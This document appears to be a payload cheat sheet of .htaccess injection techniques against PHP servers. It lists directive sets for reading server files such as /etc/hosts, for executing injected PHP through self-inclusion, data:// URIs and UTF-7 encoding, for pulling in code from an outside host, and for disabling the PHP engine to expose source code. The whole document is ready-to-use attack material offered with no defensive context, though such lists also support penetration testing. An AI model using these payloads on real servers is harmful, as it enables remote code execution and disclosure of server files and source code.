htaccess injection payload
================================

file inclusion
--------------------------------
::

    php_value auto_append_file /etc/hosts

code execution
--------------------------------
::

    php_value auto_append_file .htaccess
    #<?php phpinfo();

file inclusion
--------------------------------
::

    php_flag allow_url_include 1
    php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
    #php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B
    #php_value auto_append_file https://sektioneins.de/evil-code.txt

code execution with UTF-7
--------------------------------
::

    php_flag zend.multibyte 1
    php_value zend.script_encoding "UTF-7"
    php_value auto_append_file .htaccess
    #+ADw?php phpinfo()+ADs

Source code disclosure
--------------------------------
::

    php_flag engine 0
